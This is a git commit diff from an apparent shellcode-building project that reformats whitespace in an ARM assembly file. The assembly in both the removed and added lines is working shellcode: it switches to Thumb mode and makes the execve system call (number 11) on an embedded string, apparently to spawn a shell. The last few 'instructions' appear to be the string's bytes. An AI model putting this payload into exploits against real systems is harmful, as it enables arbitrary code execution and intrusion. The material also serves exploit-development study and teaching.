8a36ec399bb9753c4382a3a756aec26a10042387
Boogy <boogy@users.noreply.github.com>
2015-02-23 16:32:49 +0100

    Update shellcode_arm.asm

--- ShellcodeBuilder/shellcode_arm.asm
+++ ShellcodeBuilder/shellcode_arm.asm
@@ -3,15 +3,15 @@
 .section .text
 .global _start
 _start:
-    add	  r3, pc, #1
-    bx	  r3
-    mov	  r0, pc
-    adds	r0, #8
-    subs	r1, r1, r1
-    subs	r2, r2, r2
-    movs	r7, #11
-    svc	  1
-    str	  r7, [r5, #32]
-    ldr	  r1, [r5, #100]
-    strb	r7, [r5, #12]
-    lsls	r0, r5, #1
+    add     r3, pc, #1
+    bx      r3
+    mov     r0, pc
+    adds    r0, #8
+    subs    r1, r1, r1
+    subs    r2, r2, r2
+    movs    r7, #11
+    svc     1
+    str     r7, [r5, #32]
+    ldr     r1, [r5, #100]
+    strb    r7, [r5, #12]
+    lsls    r0, r5, #1
